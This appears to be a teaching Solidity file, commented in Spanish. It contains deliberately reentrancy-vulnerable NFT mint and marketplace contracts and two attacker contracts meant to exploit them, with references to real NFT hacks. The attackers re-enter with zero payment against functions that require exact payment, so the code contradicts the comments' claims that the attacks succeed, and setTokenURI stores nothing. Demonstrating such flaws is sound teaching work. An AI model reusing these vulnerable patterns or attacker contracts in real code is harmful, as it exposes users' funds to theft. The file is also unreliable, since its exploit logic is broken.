// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title VulnerableNFT
 * @notice ⚠️ VULNERABLE CODE - DO NOT USE IN PRODUCTION
 *
 * Problemas demostrados:
 * 1. Reentrancy en safeMint() - permite mintear múltiples NFTs pagando por uno
 * 2. Alto costo de gas usando ERC721Enumerable (566k gas para 5 NFTs)
 * 3. No tiene operaciones batch para transfers
 *
 * Basado en vulnerabilidades reales:
 * - NFT Trader hack (Dec 2023): $3M lost
 * - The Idols NFT (2024): $340K lost
 */
contract VulnerableNFT is ERC721Enumerable, Ownable {
    uint256 public currentTokenId;
    uint256 public constant PRICE = 0.1 ether;
    uint256 public constant MAX_SUPPLY = 10000;

    mapping(address => bool) public hasMinted;

    event NFTMinted(address indexed to, uint256 tokenId);

    constructor() ERC721("VulnerableNFT", "VNFT") Ownable(msg.sender) {
        currentTokenId = 0;
    }

    /**
     * @notice ⚠️ VULNERABLE: Reentrancy attack possible
     *
     * El problema:
     * 1. _safeMint() llama a onERC721Received() en el receiver
     * 2. El attacker puede re-entrar antes de que se actualice hasMinted
     * 3. Puede mintear múltiples NFTs pagando solo una vez
     *
     * Real hack: The Idols NFT (2024) - $340K stolen
     */
    function mint() external payable {
        require(msg.value == PRICE, "Incorrect payment");
        require(!hasMinted[msg.sender], "Already minted");
        require(currentTokenId < MAX_SUPPLY, "Max supply reached");

        uint256 newTokenId = currentTokenId;
        currentTokenId++;

        // ⚠️ VULNERABLE: External call BEFORE state update
        _safeMint(msg.sender, newTokenId);

        // ❌ TOO LATE: El attacker ya re-entró antes de llegar aquí
        hasMinted[msg.sender] = true;

        emit NFTMinted(msg.sender, newTokenId);
    }

    /**
     * @notice ⚠️ GAS INEFFICIENT: Loop sin batch operations
     *
     * Problemas:
     * - 566k gas para transferir 5 NFTs (113k cada uno)
     * - ERC721Enumerable agrega overhead significativo
     * - Sin batch transfer nativo
     */
    function transferMultiple(
        address[] calldata recipients,
        uint256[] calldata tokenIds
    ) external {
        require(recipients.length == tokenIds.length, "Length mismatch");

        // Cada transferencia cuesta ~113k gas con Enumerable
        for (uint256 i = 0; i < recipients.length; i++) {
            safeTransferFrom(msg.sender, recipients[i], tokenIds[i]);
        }
    }

    /**
     * @notice Gas-intensive metadata storage
     * Almacenar 1 byte on-chain cuesta ~20,000 gas
     * 1 KB = 20M gas ≈ $400 USD con gas a 50 gwei
     */
    function setTokenURI(uint256 tokenId, string memory uri) external {
        require(ownerOf(tokenId) == msg.sender, "Not owner");
        // En producción real, esto sería extremadamente caro
        // Por eso casi todos los NFTs usan IPFS/Arweave
    }
}

/**
 * @title VulnerableNFTMarketplace
 * @notice ⚠️ VULNERABLE: Similar to NFT Trader hack ($3M lost)
 *
 * Problema: External call BEFORE state update permite reentrancy
 */
contract VulnerableNFTMarketplace {
    struct Offer {
        address seller;
        address nftContract;
        uint256 tokenId;
        uint256 price;
        bool active;
    }

    mapping(uint256 => Offer) public offers;
    uint256 public offerCount;

    event OfferCreated(uint256 indexed offerId, address seller, uint256 price);
    event OfferAccepted(uint256 indexed offerId, address buyer);

    /**
     * @notice Create an offer to sell an NFT
     */
    function createOffer(
        address nftContract,
        uint256 tokenId,
        uint256 price
    ) external returns (uint256) {
        IERC721(nftContract).transferFrom(msg.sender, address(this), tokenId);

        uint256 offerId = offerCount++;
        offers[offerId] = Offer({
            seller: msg.sender,
            nftContract: nftContract,
            tokenId: tokenId,
            price: price,
            active: true
        });

        emit OfferCreated(offerId, msg.sender, price);
        return offerId;
    }

    /**
     * @notice ⚠️ VULNERABLE: NFT Trader style attack
     *
     * El problema:
     * 1. safeTransferFrom() hace external call a onERC721Received()
     * 2. El attacker re-entra ANTES de que se borre la oferta
     * 3. Puede aceptar la misma oferta múltiples veces
     *
     * Real hack: NFT Trader (Dec 2023) - $3M stolen
     */
    function acceptOffer(uint256 offerId) external payable {
        Offer memory offer = offers[offerId];
        require(offer.active, "Offer not active");
        require(msg.value == offer.price, "Incorrect payment");

        // ⚠️ VULNERABLE: External call BEFORE state update
        IERC721(offer.nftContract).safeTransferFrom(
            address(this),
            msg.sender,
            offer.tokenId
        );

        // Transfer payment to seller
        payable(offer.seller).transfer(msg.value);

        // ❌ TOO LATE: Attacker already re-entered
        delete offers[offerId];

        emit OfferAccepted(offerId, msg.sender);
    }

    /**
     * @notice Get offer details
     */
    function getOffer(uint256 offerId) external view returns (Offer memory) {
        return offers[offerId];
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Contract que explota la vulnerabilidad de reentrancy
 */
contract ReentrancyAttacker {
    VulnerableNFT public nft;
    uint256 public attackCount;
    uint256 public maxAttacks = 5; // Mintear 5 NFTs pagando por 1

    constructor(address _nft) {
        nft = VulnerableNFT(_nft);
    }

    /**
     * @notice Inicia el ataque de reentrancy
     */
    function attack() external payable {
        require(msg.value == nft.PRICE(), "Need payment for 1 NFT");
        attackCount = 0;
        nft.mint{value: msg.value}();
    }

    /**
     * @notice Callback que permite reentrancy
     * Se llama durante _safeMint() antes de actualizar hasMinted
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        attackCount++;

        // Re-enter while hasMinted is still false
        if (attackCount < maxAttacks) {
            nft.mint{value: 0}(); // ⚠️ No payment needed for re-entry!
        }

        return this.onERC721Received.selector;
    }

    /**
     * @notice Withdraw stolen NFTs
     */
    function withdraw(uint256 tokenId, address to) external {
        nft.safeTransferFrom(address(this), to, tokenId);
    }
}

/**
 * @title MarketplaceAttacker
 * @notice Contract que explota NFT Marketplace reentrancy
 */
contract MarketplaceAttacker {
    VulnerableNFTMarketplace public marketplace;
    uint256 public targetOfferId;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;

    constructor(address _marketplace) {
        marketplace = VulnerableNFTMarketplace(_marketplace);
    }

    /**
     * @notice Inicia el ataque contra el marketplace
     */
    function attack(uint256 offerId) external payable {
        targetOfferId = offerId;
        attackCount = 0;

        VulnerableNFTMarketplace.Offer memory offer = marketplace.getOffer(offerId);
        require(msg.value == offer.price, "Need payment");

        marketplace.acceptOffer{value: msg.value}(offerId);
    }

    /**
     * @notice Callback para reentrancy
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        attackCount++;

        if (attackCount < maxAttacks) {
            // Re-enter to accept the same offer again
            marketplace.acceptOffer{value: 0}(targetOfferId);
        }

        return this.onERC721Received.selector;
    }
}
